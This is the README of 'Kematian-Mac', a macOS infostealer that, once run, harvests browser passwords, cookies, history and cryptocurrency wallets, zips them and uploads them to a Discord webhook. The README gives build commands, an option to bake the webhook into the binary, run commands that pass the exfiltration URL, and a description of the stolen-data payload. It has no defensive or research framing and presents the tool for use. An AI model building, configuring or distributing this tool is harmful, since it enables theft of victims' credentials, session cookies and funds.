# Kematian-Mac

**Standalone macOS-only project** — not part of Overlord / StuartPirate.

Harvest binary built from **Kematian-main** recovery source (`recovery/` is macOS code only — no Windows/Linux paths). Runs once on a Mac, collects browser credentials and related data, zips the results, and posts to a **Discord webhook**.

Overlord uses the separate **Kematian Overlord plugin** on Windows/Linux. This repo is only the independent Mac executable.

## Build (on a Mac)

```bash
chmod +x scripts/build-macos.sh
./scripts/build-macos.sh
```

Outputs:

- `dist/kematian-darwin-arm64`
- `dist/kematian-darwin-amd64`

Optional: bake webhook at build time:

```bash
DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh
```

Requires **CGO** (`CGO_ENABLED=1`, default on macOS).

## Run

```bash
chmod +x dist/kematian-darwin-arm64
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/ID/TOKEN" ./dist/kematian-darwin-arm64
```

Or:

```bash
./dist/kematian-darwin-arm64 -webhook "https://discord.com/api/webhooks/ID/TOKEN"
```

`-quiet` reduces console output.

## Discord payload

- Embed with harvest counts (passwords, cookies, history, wallets, etc.)
- Zip attachment: `harvest.json`, `summary.txt`, `cookies.txt` (Netscape format when present)

Max upload size is capped under Discord’s 25MB webhook limit.

## Source

`recovery/` is from `Kematian-main/native/recovery`. Plugin/UI files from Kematian-main are not used here.